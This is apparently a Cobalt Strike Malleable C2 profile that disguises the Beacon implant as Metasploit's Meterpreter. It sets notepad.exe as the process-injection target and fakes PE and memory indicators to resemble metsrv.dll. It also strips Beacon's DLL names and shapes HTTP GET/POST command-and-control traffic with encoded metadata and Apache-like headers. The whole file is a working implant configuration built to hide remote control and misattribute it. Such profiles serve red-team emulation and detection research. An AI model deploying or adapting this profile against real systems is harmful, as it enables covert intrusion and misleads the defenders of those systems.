# Meterpreter profile
# 
# This was a fun exercise, make Beacon Meterpreter-like. :)
#
# https://www.metasploit.com/
# 
set sample_name "Meterpreter";

# 100ms sleep time. 
set sleeptime "100";

# what else would we spawn to?
set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
set spawnto_x64 "%windir%\\sysnative\\notepad.exe";

# process injection tweak
set hijack_remote_thread "false";

# propagate user-agent to all transactions
set useragent "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";

# set some PE and memory indicators to resemble the metasploit rDLL
stage {
	# PE header fields
	set checksum "0";
	set compile_time "08 May 2017 23:13:38";
	set entry_point    "558586";
	set image_size_x86 "987136";
	set image_size_x64 "1232896";
	set name "metsrv.dll";
	set rich_header "\xf4\x1f\x93\x1a\xb0\x7e\xfd\x49\xb0\x7e\xfd\x49\xb0\x7e\xfd\x49\xf6\x2f\x1c\x49\x9d\x7e\xfd\x49\xf6\x2f\x22\x49\xaf\x7e\xfd\x49\xf6\x2f\x1d\x49\x0b\x7e\xfd\x49\xcd\x07\x1d\x49\x3f\x7f\xfd\x49\xb0\x7e\xfc\x49\x63\x7e\xfd\x49\xb9\x06\x6e\x49\xa1\x7e\xfd\x49\xb9\x06\x7e\x49\xb1\x7e\xfd\x49\xbd\x2c\x22\x49\xb1\x7e\xfd\x49\xbd\x2c\x1d\x49\xaa\x7e\xfd\x49\xbd\x2c\x21\x49\xb1\x7e\xfd\x49\xbd\x2c\x23\x49\xb1\x7e\xfd\x49\x52\x69\x63\x68\xb0\x7e\xfd\x49\x00\x00\x00\x00\x00\x00\x00\x00";

	# obfuscations
	set userwx "true";
	set stomppe "false";

	# strings
	stringw "%04x-%04x:%s";
	stringw "pipe";
	stringw "SeSecurityPrivilege";
	stringw "pipe";
	stringw "\\\\%s\\pipe\\%s";
	stringw "https";
	stringw "POST";
	stringw "POST";
	string "stdapi_sys_process_getpid";
	string "[%x]";
	string "buffer_from_file";
	string "buffer_to_file";
	string "channel_close";
	string "channel_create";

	# get rid of some stuff
	transform-x86 {
		strrep "beacon.dll" "";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "";
	}
}

# SSL cert
https-certificate {
	set O  "dmcjna";
	set CN "dmcjna";
	set validity "3285";
}

# staging process
http-stager {
	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";
	}
}

# HTTP GET
http-get {
	set uri "/ucD";

	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";

		metadata {
			base64url;
			uri-append;
		}
	}

	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";

		output {
			print;
		}
	}
}

# HTTP POST
http-post {
	set uri "/ucW";

	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";

		id {
			base64url;
			append "UMJjAiNUUtvNww0lBj9tzWegwphuIn6hNP9eeIDfOrcHJ3nozYFPT-Jl7WsmbmjZnQXUesoJkcJkpdYEdqgQFE6QZgjWVsLSSDonL28DYDVJ";
			uri-append;
		}

		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";

		# this will just print an empty string, meh...
		output {
			print;
		}
	}
}
